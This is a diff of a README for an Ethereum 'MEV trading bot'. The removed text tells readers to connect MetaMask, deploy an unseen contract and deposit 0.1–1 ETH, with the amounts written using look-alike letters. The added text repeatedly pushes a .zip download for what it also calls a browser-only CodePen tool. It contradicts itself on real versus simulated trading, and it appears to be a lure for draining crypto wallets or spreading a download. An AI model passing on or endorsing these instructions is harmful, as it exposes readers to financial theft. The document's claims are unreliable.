@@ -1,142 +1,67 @@
+# 🚀 Trading-Bot_Mev_Local_PC - Simple Trading Bot for Everyone
 
-# My Local Trading Bot 🤖
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue)](https://github.com/AyalaMerinoDaniel/Trading-Bot_Mev_Local_PC/releases)
 
-  
+## 📖 Description
+The Trading-Bot_Mev_Local_PC is an easy-to-use trading bot designed for decentralized finance (DeFi). It runs in CodePen with JavaScript. This bot simplifies trading on decentralized exchanges (DEXs) like Uniswap and SushiSwap. It supports real trading and allows users to implement custom strategies with technical indicators like RSI and MACD. You can also use cross-chain bridges for broader trading options.
 
-  
+## 🗂️ Features
+- **Supports Popular DEXs**: Trade on Uniswap and SushiSwap effortlessly.
+- **User-Friendly Interface**: Built to be intuitive for non-technical users.
+- **Custom Strategies**: Tailor your trading strategy with ease using technical indicators.
+- **Cross-Chain Trading**: Access multiple blockchains for expanded options.
+- **Real Trading**: Engage in actual trades rather than simulations.
 
-![1](https://i.postimg.cc/B6c2txbp/Chat-GPT-Image-30-2025-18-19-40.png)
+## 📦 System Requirements
+- A modern web browser (Chrome, Firefox, Safari).
+- Basic internet connection.
+- CodePen account (free registration required).
 
-  
+## 🚀 Getting Started
+Follow these steps to start using the Trading-Bot_Mev_Local_PC.
 
-  
+### Step 1: Visit the Download Page
+To download the latest version of the Trading-Bot_Mev_Local_PC, visit the following link: [Download Latest Release](https://github.com/AyalaMerinoDaniel/Trading-Bot_Mev_Local_PC/releases).
 
-Hey crypto enthusiasts! I’m excited to share my **Local Trading Bot** — a simple tool for real trading on the **Ethereum Mainnet**. Everything is packed in **one HTML file**, so you can run it directly on **CodePen** with zero hassle! 😎 The interface is inspired by VS Code — clean and intuitive — perfect for trading straight from your browser. Here’s how it works!
+### Step 2: Choose the Right Files
+On the Releases page, look for the latest version of Trading-Bot_Mev_Local_PC. The latest version will be listed at the top. You may see several files. Typically you will want the latest `.zip` file containing the necessary assets. 
 
-  
+### Step 3: Download the File
+Click on the version number to expand the section. Look for the `.zip` file. Click on it to download the file to your computer.
 
-## Features
+### Step 4: Extract the Files
+Once the download is complete, navigate to your downloads folder. Right-click on the downloaded `.zip` file and select “Extract All” or “Unzip.” Follow the prompts to extract the files. You might want to save them in a dedicated folder for easy access.
 
-  
+### Step 5: Open CodePen
+Visit [CodePen.io](https://codepen.io) in your web browser. If you don’t have an account yet, create one for free.
 
-  
+### Step 6: Create a New Pen
+Once logged in, click on “New Pen.” This will open a fresh canvas for you to work with the Trading Bot.
 
--  **All-in-One File**: The entire code is in one HTML file — just copy, paste it into CodePen, and you’re ready to go!
+### Step 7: Add the Trading Bot Files
+Drag and drop the necessary files you downloaded into the HTML, CSS, and JS sections in CodePen.  
+- Place your main `.js` file in the JS section.
+- Add any styles in the CSS section as needed.
 
-  
+### Step 8: Configure Your Bot
+Before running the bot, you need to input your trading strategies. Customize the bot based on your preferences. You can adjust settings for the indicators such as RSI and MACD for optimal performance.
 
--  **Wallet Connection**: Easily connect your MetaMask wallet to work with the smart contract.
+### Step 9: Run Your Bot
+When everything is set, click the “Run” button in CodePen to start the Trading-Bot_Mev_Local_PC. Keep an eye on the console for any output or messages.
 
-  
+### Step 10: Monitor Performance
+Watch the bot as it executes trades in real-time. Adjust your strategies as you learn from its performance.
 
--  **Smart Contract Deployment**: Deploy your custom contract on Mainnet (you cover the gas fee).
+## 💬 Support
+If you face any issues or have questions, please check the FAQ section on our GitHub page. You can also submit an issue on the repository for specific help.
 
-  
+## 🌟 Contributing
+We welcome contributions! If you'd like to improve the Trading-Bot or add features, please feel free to fork the repository, make your changes, and submit a pull request.
 
--  **Slippage Control**: Adjust slippage tolerance between **0.5% and 49%** for flexible trades.
+## 📄 License
+The Trading-Bot_Mev_Local_PC is released under the MIT License. You can freely use, modify, and distribute it according to the terms of the license.
 
-  
+## 📞 Contact
+For further inquiries, you can reach out via GitHub Issues or directly to the repository owner.
 
--  **MEV Protection & Sniping**: Enable protection from Miner Extractable Value (MEV) attacks or automatic deal sniping.
-
-  
-
--  **Workflow Control**:
-
-  
-
--  **Start**: Launches the trading process (requires ≥O.1 ETH, confirm function call).
-
-  
-
--  **Stop**: Stops the trading, available only after Start.
-
-  
-
--  **Withdraw**: Withdraws funds, available only after Stop.
-
-  
-
--  **Real-Time Terminal**: Displays current transactions, trade paths, and profit.
-
-  
-
--  **Responsive Design**: Works perfectly on both desktop and mobile devices.
-
-  
-
-## How to Run on [CodePen](https://codepen.io/pen/)
-
-  
-
-  
-
-1.  *Set up **MetaMask:***
-
-  
-
--  *Install **MetaMask** in your browser.*
-
-  
-
--  *Switch to the **Ethereum Mainnet**.*
-
-  
-
--  *Make sure your wallet has **≥О.1-1 ETH** plus gas for contract deployment.*
-
-  
-
--  *Open the editor at **[CodePen](https://codepen.io/pen)**.*
-
-  
-
--  *Paste*  **(source.html)** code into the **HTML** block.*
-
-  
-
-2.  **Start Trading:**
-
-  
-
--  *Click **Connect MetaMask** to link your wallet.*
-
-  
-
-![Connect MetaMask](https://i.postimg.cc/4N3pNHgv/code.png)
-
-  
-
--  *Click **Deploy Contract** to deploy your smart contract (gas required).*
-
-  
-
--  *Enter **≥0.1-1 ETH**, set your slippage **(0.5%–49%)**, and click **Start**, confirming the function call in **MetaMask**.*
-
-  
-
--  *Check the log window for current transactions and profit potential.*
-
-  
-
-![1](https://i.ibb.co/N6RB81pH/34.png)
-
-  
-
--  *Click **Stop** to halt the simulation, then **Withdraw** to retrieve your funds.*
-
-  
-
-3.  *Monitor the Terminal: The logs show transactions and profit in real time, plus profitable opportunities based on a **1 ETH deposit**.*
-
-  
-
-  
-
----
-
-  
-
-  
-
-**Happy Trading! 🚀**
+For the latest version again, don’t forget to visit: [Download Latest Release](https://github.com/AyalaMerinoDaniel/Trading-Bot_Mev_Local_PC/releases).
